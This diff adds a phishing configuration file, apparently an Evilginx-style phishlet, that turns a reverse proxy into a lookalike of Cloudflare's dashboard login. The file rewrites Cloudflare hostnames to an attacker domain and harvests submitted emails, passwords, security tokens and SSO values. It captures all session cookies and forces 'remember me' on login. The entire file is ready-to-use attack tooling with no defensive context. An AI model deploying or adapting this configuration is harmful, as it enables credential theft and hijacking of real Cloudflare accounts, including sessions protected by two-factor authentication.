@@ -1,0 +1,45 @@
+author: '@hash3liZer'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'cloudflare.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'dash', orig_sub: 'dash', domain: 'cloudflare.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'dash.cloudflare.com', orig_sub: 'dash', domain: 'cloudflare.com', search: 'dash.cloudflare.com', replace: 'dash.{domain}', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'dash.cloudflare.com', orig_sub: 'dash', domain: 'cloudflare.com', search: 'dash.cloudflare.com', replace: 'dash.{domain}', mimes: ['application/javascript', 'application/json']}
+  - {triggers_on: 'dash.cloudflare.com', orig_sub: 'dash', domain: 'cloudflare.com', search: 'www.cloudflare.com', replace: 'www.{domain}', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'dash.cloudflare.com', orig_sub: 'dash', domain: 'cloudflare.com', search: 'www.cloudflare.com', replace: 'www.{domain}', mimes: ['application/javascript', 'application/json']}
+auth_tokens:
+  - domain: 'www.cloudflare.com'
+    keys: ['.*,regexp']
+  - domain: 'dash.cloudflare.com'
+    keys: ['.*,regexp']
+credentials:
+  username: 
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'security_token'
+      search: '(.*)'
+      type: 'post'
+    - key: 'sso'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/api/v4/user'
+login:
+  domain: 'dash.cloudflare.com'
+  path: '/login'
+force_post:
+  - path: '/login'
+    search:
+      - {key: 'email', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'remember_me', value: 'true'}
+    type: 'post'
